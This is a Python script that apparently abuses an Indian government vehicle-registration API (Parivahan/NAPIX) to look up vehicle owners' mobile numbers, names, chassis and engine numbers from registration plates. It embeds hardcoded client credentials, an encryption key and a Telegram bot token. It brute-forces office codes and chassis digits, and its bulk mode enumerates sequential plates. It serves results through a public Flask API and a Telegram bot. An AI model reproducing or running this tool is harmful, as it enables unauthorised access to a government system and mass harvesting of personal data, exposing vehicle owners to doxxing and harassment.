import sys
try:
    sys.stdout.reconfigure(line_buffering=True)
    sys.stderr.reconfigure(line_buffering=True)
except Exception:
    pass

_a = sys.argv
_BOOT = 0
if len(_a) >= 4 and _a[1].lower() == 'bulk':
    sys.stdout.write('🔍 %s RCs | %s threads | last5 chassis\n⏳ token...\n' % (_a[3], _a[4] if len(_a) > 4 else 20))
    sys.stdout.flush()
    _BOOT = 1

import json, re, time, base64, threading, os, urllib3, requests
from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from flask import Flask, request, jsonify

urllib3.disable_warnings()

P, C, S = '!~)#@*&^', 'b91c303443f61b37106750823881cd2f', 'de83eeeb148878ae375f28756492e8a0'
G = 'https://delhigw.napix.gov.in/nic/parivahan'
U = G + '/mparivahan/wrapperapi/vahan/vahancapi/updatemobile/getMobileNo'
HP = G + '/mparivahan/wrapperapi/vahan/vahancapi/hpt/search'
QC = G + '/mparivahan/wrapperapi/vahan/vahancapi/updatemobile/getclassanddescription'
A, V, DG, AL = 'okhttp/5.0.0-alpha.11', '2.0.142', '0123456789', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
ST = frozenset('AN AP AR AS BR CG CH DD DL DN GA GJ HP HR JH JK KA KL LA LD MH ML MN MP MZ NL OD OR PB PY RJ SK TN TR TS UA UK UP WB'.split())
O = {'HR26': '70', 'HR38': '70', 'HR55': '70', 'HR72': '70', 'HR76': '70', 'RJ60': '14', 'DL10': '10', 'DL1': '1', 'UK18': '18', 'UA18': '18'}
RX = re.compile(r'^(?:\d{2}BH\d{4}[A-Z]{2}|[A-Z]{2}\d{1,2}[A-Z]{0,3}\d{1,4}|[A-Z]{3}\d{1,4})$')

_lk, _tk, _ts, _slk = threading.Lock(), None, 0.0, threading.Lock()
_gs = _gx = None
_sem = threading.Semaphore(48)

# ============ TELEGRAM BOT CONFIG ============
BOT_TOKEN = "8415742587:AAFtsM3XYynwaWUhX_EgV4Wx2phx11uUK6U"
TG_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
TG_POLL_TIMEOUT = 30
TG_REQUEST_TIMEOUT = 25
TG_MAX_MSG_LEN = 4000
TG_TOKEN_RETRY_EVERY = 30
# ===========================================

def K(t):
    r = t[::-1]
    return ((r if len(r) <= 3 else r[:4] + r[-4:]) + P).encode()

def E(o, t):
    return base64.b64encode(
        base64.b64encode(
            AES.new(K(t), AES.MODE_ECB).encrypt(
                pad(json.dumps(o, separators=(',', ':')).encode(), 16)
            )
        )
    ).decode()

def X(b, t):
    raw = base64.b64decode(b)
    try:
        r2 = base64.b64decode(raw)
        if len(r2) % 16 == 0:
            raw = r2
    except Exception:
        pass
    return json.loads(unpad(AES.new(K(t), AES.MODE_ECB).decrypt(raw), 16))

def N(r):
    return re.sub(r'[\s\-]', '', r.upper())

def STT(r):
    if re.match(r'^\d{2}BH', r):
        return 'DL'
    s = r[:2]
    return s if s in ST else 'DL'

def OS(x):
    if x is None or x == '':
        return
    try:
        return str(int(x))
    except Exception:
        return str(x)

def PO(r):
    if re.match(r'^\d{2}BH', r):
        return
    for k, v in sorted(O.items(), key=lambda x: -len(x[0])):
        if r.startswith(k):
            return v
    m = re.match(r'^[A-Z]{2}(\d{1,2})', r)
    if m:
        d = m.group(1)
        return d.zfill(2) if len(d) == 1 else d
    m = re.search(r'(\d{1,2})', r[2:] if len(r) > 2 else r)
    if m:
        d = m.group(1)
        return d.zfill(2) if len(d) == 1 else d
    return '1'

def OF(r, e=None):
    o = []
    def a(x):
        x = OS(x)
        if x and x not in o:
            o.append(x)
    a(e)
    p = PO(r)
    if p:
        a(p)
        a(p.lstrip('0') or '0')
        a(str(p).zfill(2))
    for x in ('14', '10', '1', '16', '20', '70'):
        a(x)
    return o

def SS():
    global _gs
    if _gs is None:
        with _lk:
            if _gs is None:
                s = requests.Session()
                s.verify = False
                s.headers['User-Agent'] = A
                ad = requests.adapters.HTTPAdapter(pool_connections=48, pool_maxsize=48, max_retries=0)
                s.mount('https://', ad)
                s.mount('http://', ad)
                _gs = s
    return _gs

def GX(n=40):
    global _gx
    if _gx is None:
        _gx = ThreadPoolExecutor(max_workers=n)
    return _gx

def TK(f=0):
    global _tk, _ts
    with _lk:
        if not f and _tk and time.time() - _ts < 2800:
            return _tk
        for i in range(6):
            try:
                r = SS().post(
                    G + '/oauth2/token',
                    data={
                        'grant_type': 'client_credentials',
                        'scope': 'napix',
                        'client_id': C,
                        'client_secret': S
                    },
                    headers={
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'User-Agent': A
                    },
                    timeout=(10, 25)
                )
                if r.status_code == 200:
                    t = r.json().get('access_token')
                    if t:
                        _tk, _ts = t, time.time()
                        return t
            except requests.RequestException:
                time.sleep(.2 * (i + 1))
        return None

def P1(u, t, o):
    ts = str(int(time.time() * 1000))
    h = {
        'Authorization': 'Bearer ' + t,
        'Timestamp': ts,
        'Param1': 'null',
        'Param2': V,
        'Content-Type': 'application/json; charset=utf-8',
        'Accept': 'application/json',
        'User-Agent': A
    }
    z = None
    for i in range(4):
        try:
            with _sem:
                z = SS().post(u, headers=h, data=json.dumps({'data': E(o, ts)}), timeout=(10, 25))
            break
        except requests.RequestException:
            time.sleep(.12 * (i + 1))
    return z, ts

def T1(r, o, c, t, s):
    z, ts = P1(U, t, {'regnNo': r, 'stateCode': s, 'chassisNo': str(c), 'officeCode': str(o), 'purCd': '135'})
    if z is None:
        return None, 0, 0
    if z.status_code == 401:
        return None, 0, 1
    if z.status_code != 200:
        return None, 0, 0
    try:
        d = X(z.json()['data'], ts)
    except Exception:
        return None, 0, 0
    a = d.get('data') if isinstance(d, dict) else None
    ok = isinstance(a, dict) and a.get('mobileNo') not in (None, '')
    return (d if ok else None), int(ok), 0

def HO(r, t):
    z, ts = P1(HP, t, {'regnNo': r})
    if z is None or z.status_code != 200:
        return
    try:
        d = X(z.json()['data'], ts)
    except Exception:
        return
    a = d.get('data') if isinstance(d, dict) else None
    h = a.get('hptdetails') if isinstance(a, dict) else None
    if isinstance(h, list):
        h = h[0] if h else None
    return OS(h.get('off_cd')) if isinstance(h, dict) else None

def EXS(r, t, s):
    z, ts = P1(QC, t, {'regnNo': r, 'stateCode': s})
    if z is None or z.status_code != 200:
        return 1
    try:
        d = X(z.json()['data'], ts)
    except Exception:
        return 1
    m = d.get('apiMessage') if isinstance(d, dict) else None
    return isinstance(m, dict) and m.get('statusCode') == 200

def F(r, full=0):
    r = N(r)
    t = TK()
    if not t:
        return
    s = STT(r)
    sp = threading.Event()
    bx = []
    tr = set()

    def one(o, c):
        if sp.is_set():
            return
        d, ok, af = T1(r, o, c, t, s)
        if af:
            t2 = TK(1)
            if t2:
                d, ok, _ = T1(r, o, c, t2, s)
        if ok and d:
            bx.append(d)
            sp.set()

    def br(ofs, ch=DG):
        fs = []
        for o in ofs:
            o = OS(o)
            if not o:
                continue
            for c in ch:
                k = o + ':' + c
                if k in tr:
                    continue
                tr.add(k)
                fs.append(GX().submit(one, o, c))
        if not fs:
            return 0
        for f in as_completed(fs):
            if bx:
                sp.set()
                for x in fs:
                    x.cancel()
                return 1
        return int(bool(bx))

    p = PO(r)
    w = []
    if p:
        w.append(p)
        u = p.lstrip('0') or '0'
        if u != p:
            w.append(u)
    hf = GX().submit(HO, r, t)
    if br(w):
        return bx[0]
    try:
        hf = hf.result(timeout=8)
    except Exception:
        hf = None
    if hf and br([hf]):
        return bx[0]
    if hf and br([hf], AL):
        return bx[0]
    if br(OF(r, hf)):
        return bx[0]
    if full:
        if not EXS(r, t, s):
            return
        if br([str(i) for i in range(1, 100)]):
            return bx[0]
    return bx[0] if bx else None

def mob(d):
    if d and isinstance(d.get('data'), dict):
        m = d['data'].get('mobileNo')
        if m not in (None, ''):
            return m

def SR(st, n):
    m = re.search(r'^(.*?)(\d+)$', st)
    if not m:
        raise SystemExit('bad start')
    p, num = m.group(1), m.group(2)
    w, s0 = len(num), int(num)
    return [f'{p}{str(s0 + i).zfill(w)}' for i in range(n)]

def clr():
    sys.stderr.write('\r\033[K')
    sys.stderr.flush()

def B(st, n, th=20):
    rs = SR(N(st), n)
    tot = len(rs)
    if not _BOOT:
        print(f'🔍 {tot} RCs | {th} threads | last5 chassis', flush=True)
        print('⏳ token...', flush=True)
    stt = {'dn': 0, 'fd': 0, 'ms': 0, 't0': time.time(), 'ph': 'token'}
    die = threading.Event()
    fr = '⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏'

    def bar():
        i = 0
        while not die.wait(0.06):
            el = time.time() - stt['t0']
            ph = stt['ph']
            if ph == 'token':
                s = f'{fr[i % 10]} token  ⏱️ {el:.1f}s'
            else:
                s = f'{fr[i % 10]} {stt["dn"]}/{tot}  ✅ {stt["fd"]}  ❌ {stt["ms"]}  ⏱️ {el:.1f}s'
            sys.stderr.write('\r\033[K' + s)
            sys.stderr.flush()
            i += 1

    threading.Thread(target=bar, daemon=True).start()
    GX(max(40, th))
    SS()
    if not TK():
        die.set()
        clr()
        print('❌ token failed', flush=True)
        sys.exit(1)
    clr()
    print('✅ go', flush=True)
    stt['ph'] = 'run'
    stt['t0'] = time.time()

    def out(line):
        with _slk:
            clr()
            print(line, flush=True)

    with ThreadPoolExecutor(max_workers=th) as ex:
        fs = {ex.submit(F, r, 0): r for r in rs}
        for x in as_completed(fs):
            g = fs[x]
            try:
                d = x.result()
                m = mob(d)
            except Exception:
                stt['dn'] += 1
                stt['ms'] += 1
                out(f'❌ {g}')
                continue
            stt['dn'] += 1
            if m:
                stt['fd'] += 1
                out(f'✅ {g} → {m}')
            else:
                stt['ms'] += 1
                out(f'❌ {g}')
    die.set()
    time.sleep(0.05)
    clr()
    print(f'📊 {stt["fd"]}/{tot} found  ❌ {stt["ms"]}  ⏱️ {time.time() - stt["t0"]:.1f}s', flush=True)
    if _gx:
        try:
            _gx.shutdown(wait=False, cancel_futures=True)
        except Exception:
            pass
    os._exit(0)

_stats = {
    'total': 0,
    'found': 0,
    'not_found': 0,
    'ips': {},
    'dates': {}
}

def run_api():
    SS()
    GX(40)
    print("⏳ Fetching token...", end=' ', flush=True)
    token = TK()
    if not token:
        print("❌ Failed to get token. Exiting.")
        sys.exit(1)
    print("✅ Token ready.")

    app = Flask(__name__)

    @app.route('/api/<path:vehicle_number>', methods=['GET'])
    def get_mobile(vehicle_number):
        client_ip = request.remote_addr
        today = time.strftime('%Y-%m-%d')
        if today not in _stats['dates']:
            _stats['dates'][today] = {'total': 0, 'found': 0, 'not_found': 0}
        _stats['total'] += 1
        _stats['ips'][client_ip] = _stats['ips'].get(client_ip, 0) + 1
        _stats['dates'][today]['total'] += 1

        try:
            with ThreadPoolExecutor(max_workers=1) as ex:
                future = ex.submit(F, vehicle_number, 1)
                res = future.result(timeout=20)
        except TimeoutError:
            _stats['not_found'] += 1
            _stats['dates'][today]['not_found'] += 1
            return jsonify({'error': 'Lookup timeout'}), 408

        mobile = mob(res) if res else None
        if mobile:
            _stats['found'] += 1
            _stats['dates'][today]['found'] += 1
            return jsonify({'vehicle': vehicle_number.upper(), 'mobile': mobile})
        else:
            _stats['not_found'] += 1
            _stats['dates'][today]['not_found'] += 1
            return jsonify({'error': 'Not found'}), 404

    @app.route('/stats', methods=['GET'])
    def get_stats():
        return jsonify(_stats)

    @app.route('/')
    def root():
        return jsonify({
            'status': 'API running',
            'endpoints': ['/api/<vehicle>', '/stats']
        })

    app.run(host='0.0.0.0', port=6958, debug=False, use_reloader=False)

# ============ TELEGRAM BOT ============
def tg_call(method, **params):
    try:
        r = requests.post(f"{TG_API}/{method}", json=params, timeout=TG_REQUEST_TIMEOUT)
        return r.json()
    except Exception as e:
        return {"ok": False, "error": str(e)}

def tg_get_updates(offset=None, timeout=TG_POLL_TIMEOUT):
    params = {"timeout": timeout, "allowed_updates": ["message", "edited_message"]}
    if offset is not None:
        params["offset"] = offset
    try:
        r = requests.post(f"{TG_API}/getUpdates", json=params, timeout=timeout + 10)
        return r.json()
    except Exception as e:
        return {"ok": False, "result": [], "error": str(e)}

def tg_send(chat_id, text, reply_to=None):
    if len(text) > TG_MAX_MSG_LEN:
        text = text[:TG_MAX_MSG_LEN - 20] + "\n...[truncated]"
    params = {"chat_id": chat_id, "text": text, "disable_web_page_preview": True}
    if reply_to:
        params["reply_to_message_id"] = reply_to
    return tg_call("sendMessage", **params)

def tg_typing(chat_id):
    try:
        requests.post(
            f"{TG_API}/sendChatAction",
            json={"chat_id": chat_id, "action": "typing"},
            timeout=5
        )
    except Exception:
        pass

def tg_delete_webhook():
    try:
        r = requests.post(f"{TG_API}/deleteWebhook",
                          json={"drop_pending_updates": False},
                          timeout=10)
        return r.json()
    except Exception as e:
        return {"ok": False, "error": str(e)}

def fmt_result(vehicle, data):
    if not data:
        return f"❌ {vehicle} — Not found"
    m = mob(data)
    if not m:
        return f"❌ {vehicle} — Not found"
    lines = [f"✅ {vehicle} → 📱 {m}"]
    d = data.get('data') if isinstance(data, dict) else None
    if isinstance(d, dict):
        rc = d.get('regnNo') or d.get('regNo')
        if rc and str(rc).upper() != vehicle.upper():
            lines.append(f"🔎 RC: {rc}")
        owner = d.get('ownerName') or d.get('owner')
        if owner:
            lines.append(f"👤 {owner}")
        chassis = d.get('chassisNo')
        if chassis:
            lines.append(f"🔩 {chassis}")
        engine = d.get('engineNo')
        if engine:
            lines.append(f"⚙️ {engine}")
        maker = d.get('makerDescription') or d.get('maker')
        if maker:
            lines.append(f"🏭 {maker}")
        model = d.get('modelDescription') or d.get('model')
        if model:
            lines.append(f"🚗 {model}")
    return "\n".join(lines)

def tg_run_bot():
    print("🤖 Telegram bot starting...", flush=True)

    # Clear any stale webhook so getUpdates works
    wh = tg_delete_webhook()
    print(f"🔗 Webhook: {wh.get('description') or wh}", flush=True)

    # Verify bot identity
    me = tg_call("getMe")
    if me.get("ok"):
        uname = me["result"].get("username", "bot")
        print(f"🤖 @{uname} online (id={me['result'].get('id')}).", flush=True)
    else:
        print(f"❌ getMe failed: {me}", flush=True)

    # Warm up Napix session (non-fatal)
    SS()
    GX(40)
    print("⏳ Warming Napix token (non-fatal)...", end=' ', flush=True)
    if TK():
        print("✅", flush=True)
    else:
        print("⚠️ (will retry per request)", flush=True)

    print("📡 Polling Telegram...", flush=True)

    offset = None
    last_token_attempt = 0
    while True:
        try:
            if not _tk and time.time() - last_token_attempt > TG_TOKEN_RETRY_EVERY:
                last_token_attempt = time.time()
                threading.Thread(target=TK, daemon=True).start()

            upd = tg_get_updates(offset)
            if not upd.get("ok"):
                err = upd.get("error") or upd.get("description") or "unknown"
                print(f"⚠️ getUpdates error: {err}", flush=True)
                time.sleep(2)
                continue

            for u in upd.get("result", []):
                offset = u["update_id"] + 1
                msg = u.get("message") or u.get("edited_message")
                if not msg:
                    continue
                chat_id = msg["chat"]["id"]
                text = (msg.get("text") or "").strip()
                if not text:
                    continue

                print(f"📩 {chat_id}: {text[:60]}", flush=True)

                if text.startswith("/start"):
                    tg_send(
                        chat_id,
                        "🤖 Send a vehicle number.\nExample: `DL1AB1234`",
                        reply_to=msg["message_id"]
                    )
                    continue

                if text.startswith("/stats"):
                    tg_send(
                        chat_id,
                        f"📊 Total: {_stats['total']}\n"
                        f"✅ Found: {_stats['found']}\n"
                        f"❌ Not found: {_stats['not_found']}",
                        reply_to=msg["message_id"]
                    )
                    continue

                if text.startswith("/ping"):
                    tg_send(chat_id, "🏓 pong", reply_to=msg["message_id"])
                    continue

                vehicle = N(text)
                if not RX.match(vehicle):
                    tg_send(
                        chat_id,
                        f"❌ Invalid vehicle number: `{text}`",
                        reply_to=msg["message_id"]
                    )
                    continue

                tg_typing(chat_id)

                try:
                    with ThreadPoolExecutor(max_workers=1) as ex:
                        fut = ex.submit(F, vehicle, 1)
                        res = fut.result(timeout=30)
                except TimeoutError:
                    tg_send(chat_id, f"⏱️ {vehicle} — Lookup timeout",
                            reply_to=msg["message_id"])
                    _stats['total'] += 1
                    _stats['not_found'] += 1
                    continue
                except Exception as e:
                    tg_send(chat_id, f"❌ {vehicle} — Error: {e}",
                            reply_to=msg["message_id"])
                    _stats['total'] += 1
                    _stats['not_found'] += 1
                    continue

                _stats['total'] += 1
                if mob(res):
                    _stats['found'] += 1
                else:
                    _stats['not_found'] += 1

                tg_send(chat_id, fmt_result(vehicle, res),
                        reply_to=msg["message_id"])

        except KeyboardInterrupt:
            print("\n🛑 Bot stopped.", flush=True)
            break
        except Exception as e:
            print(f"⚠️ Poll loop error: {e}", flush=True)
            time.sleep(2)

# ===========================================

if __name__ == "__main__":
    a = sys.argv
    if len(a) >= 4 and a[1].lower() == 'bulk':
        B(a[2], int(a[3]), int(a[4]) if len(a) > 4 else 20)
    elif len(a) == 2 and a[1].lower() == 'api':
        run_api()
    elif len(a) == 2 and a[1].lower() == 'bot':
        tg_run_bot()
    elif len(a) == 1:
        tg_run_bot()
    elif len(a) == 2:
        r = N(a[1])
        GX(10)
        SS()
        if not RX.match(r):
            print(json.dumps({'error': 'bad_rc'}))
            sys.exit(2)
        try:
            with ThreadPoolExecutor(max_workers=1) as ex:
                future = ex.submit(F, r, 1)
                d = future.result(timeout=20)
        except TimeoutError:
            print(json.dumps({'error': 'timeout'}))
            sys.exit(1)
        if d:
            print(json.dumps(d, ensure_ascii=False, separators=(',', ':')))
            sys.exit(0)
        print(json.dumps({'error': 'miss'}))
        sys.exit(1)
    else:
        print('usage: bot.py [REG | bulk START N [THREADS] | api | bot]')
        sys.exit(2)
